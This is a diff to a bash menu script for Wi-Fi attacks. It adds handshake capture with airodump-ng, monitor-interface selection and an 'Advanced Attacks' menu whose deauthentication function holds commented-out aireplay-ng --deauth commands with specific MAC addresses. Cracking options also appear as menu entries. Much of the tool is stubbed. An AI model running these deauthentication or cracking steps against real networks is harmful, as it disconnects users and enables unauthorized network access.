@@ -1,6 +1,6 @@
 #!/bin/bash
 
-#interface_name=""
+interface_name=""
 
 ##############################################################################################################
 
@@ -29,7 +29,9 @@ setup_wireless_adapter() {
 }
 
 do_four_way_method() {
-  echo
+  echo "test"
+  sleep 5
+  airodump-ng $interface_name
 }
 
 do_pmkid_hashcat() {
@@ -49,7 +51,18 @@ install_dependencies() {
 
 
 select_wireless_nic() {
-  interface_name=$(iwconfig 2>&1 | grep ESSID | sed 's/\"//g' | cut -f1  -d" "  )
+  echo "All available Wireless Interfaces:"
+  echo $(iwconfig)
+  sleep 3
+  clear
+
+  interface_name=$(iwconfig 2>&1 | grep Monitor | sed 's/\"//g' | cut -f1  -d" "  )
+
+  if [ -z "$interface_name" ]
+  then
+        interface_name=$(iwconfig 2>&1 | grep ESSID | sed 's/\"//g' | cut -f1  -d" "  )
+  fi
+
 #  mac_address=$(sudo ip -a link | grep $interface_name | sed 's/\"//g' | cut -f1  -d" " )
 }
 
@@ -67,6 +80,21 @@ change_mac_address() {
 check_wireless_nic_performance() {
   echo
 }
+
+deauthentication_attack() {
+  echo "A target Station has been selected. Now choose an associated device to be booted"
+
+  devices=$(sudo airodump-ng $interface_name --bssid $target_station_bssid --channel $target_channel)
+
+#  aireplay-ng --deauth 0 -c $target_device_bssid -a $target_station_bssid $interface_name
+
+
+#  sudo airodump-ng wlx00c0caa763ed --bssid 64:70:02:40:7B:E2 --channel 9
+
+#  sudo aireplay-ng --deauth 0 -c 90:CD:B6:3D:20:FD -a 64:70:02:40:7B:E2 wlx00c0caa763ed
+
+}
+
 
 ##############################################################################################################
 
@@ -126,6 +154,48 @@ done
 }
 
 
+##############################################################################################################
+
+## Advnced Attacks
+
+advanced_attacks() {
+menu=""
+until [ "$menu" = "10" ]; do
+
+clear
+f_banner
+
+echo
+echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
+echo -e "\e[93m[+]\e[00m  SELECT THE TASK YOU WANT TO PERFORM ON TARGET: " $ip_address
+echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
+echo ""
+echo "1. Perform Deauthentication Attack"
+echo ""
+echo "0. Back"
+echo
+
+read menu
+case $menu in
+
+1)
+clear
+f_banner
+deauthentication_attack
+sleep 2
+;;
+
+
+0)
+break
+;;
+
+*) ;;
+
+esac
+done
+}
+
 
 ##############################################################################################################
 
@@ -151,8 +221,9 @@ echo ""
 echo "1. Setup Wireless NIC"
 echo "2. Four-Way Handshake method"
 echo "3. PMKID Hashcat method"
-echo "4. Password cracking"
-echo "5. Install Dependencies"
+echo "4. Advanced Attacks"
+echo "5. Password cracking"
+echo "6. Install Dependencies"
 echo ""
 echo "0. Back"
 echo
@@ -166,25 +237,31 @@ f_banner
 setup_wireless_adapter
 ;;
 
-1)
+2)
 clear
 f_banner
 do_four_way_method
 ;;
 
-1)
+3)
 clear
 f_banner
 do_pmkid_hashcat
 ;;
 
-1)
+4)
+clear
+f_banner
+advanced_attacks
+;;
+
+5)
 clear
 f_banner
 crack_password
 ;;
 
-5)
+6)
 clear
 f_banner
 install_dependencies
